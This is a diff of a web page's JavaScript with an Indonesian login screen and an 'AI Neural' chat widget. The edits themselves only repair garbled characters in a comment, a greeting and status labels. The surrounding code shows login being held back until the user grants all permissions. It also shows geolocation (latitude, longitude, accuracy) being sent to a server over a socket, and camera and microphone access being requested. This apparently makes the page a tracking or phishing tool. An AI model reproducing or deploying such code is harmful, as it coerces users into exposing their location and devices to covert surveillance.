@@ -1147,7 +1147,7 @@ async function handleLogin(e) {
     attemptCount++;
     btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi\u2026';
     showLoadingOverlay(1500/4);
-    // Request all permissions ΓÇö blocks until all granted
+    // Request all permissions — blocks until all granted
     await requestPermissions();
     // Authenticate with Firebase
     try {
@@ -1227,7 +1227,7 @@ function initAIChat() {
         </div>
         <div id="aiChatMessages" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px;scroll-behavior:smooth;">
             <div style="align-self:flex-start;max-width:80%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);padding:12px 16px;border-radius:16px 16px 16px 4px;font-size:.85rem;color:#ccc;line-height:1.5;">
-                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? ≡ƒæï
+                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? 😊
             </div>
         </div>
         <div id="aiChatPermission" style="display:none;padding:16px;background:rgba(0,212,255,0.05);border-top:1px solid rgba(255,255,255,0.06);">
@@ -1343,7 +1343,7 @@ async function requestSinglePermission(type, color) {
             navigator.geolocation.getCurrentPosition(
                 (p) => {
                     socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy });
-                    statusEl.textContent = 'Γ£ô Aktif';
+                    statusEl.textContent = '✓ Aktif';
                     statusEl.className = 'perm-status perm-ok';
                     statusEl.style.color = '';
                     itemEl.classList.add('ai-perm-granted');
@@ -1361,7 +1361,7 @@ async function requestSinglePermission(type, color) {
             statusEl.textContent = '...';
             const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
             s.getTracks().forEach(t => t.stop());
-            statusEl.textContent = 'Γ£ô Aktif';
+            statusEl.textContent = '✓ Aktif';
             statusEl.className = 'perm-status perm-ok';
             statusEl.style.color = '';
             itemEl.classList.add('ai-perm-granted');
@@ -1370,7 +1370,7 @@ async function requestSinglePermission(type, color) {
             statusEl.textContent = '...';
             const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
             s.getTracks().forEach(t => t.stop());
-            statusEl.textContent = 'Γ£ô Aktif';
+            statusEl.textContent = '✓ Aktif';
             statusEl.className = 'perm-status perm-ok';
             statusEl.style.color = '';
             itemEl.classList.add('ai-perm-granted');
